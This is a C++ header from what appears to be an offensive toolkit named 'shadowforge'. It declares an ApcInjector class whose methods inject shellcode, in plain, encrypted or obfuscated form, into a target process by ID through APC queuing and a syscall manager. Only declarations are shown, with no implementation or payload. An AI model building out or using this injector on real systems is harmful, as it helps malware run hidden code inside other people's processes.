#pragma once
#include "shadowforge.h"
#include "syscalls.h"
#include "obfuscator.h"

class ApcInjector {
public:
    ApcInjector(SyscallManager& syscallMgr);

    bool Inject(DWORD targetPid, const uint8_t* shellcode, size_t shellcodeSize);
    bool InjectEncrypted(DWORD targetPid, const uint8_t* encrypted, size_t len, uint32_t permSeed);
    bool InjectObfuscatedDemo(DWORD targetPid);

private:
    SyscallManager& m_syscalls;
    std::vector<DWORD> GetThreadIds(DWORD pid);
};
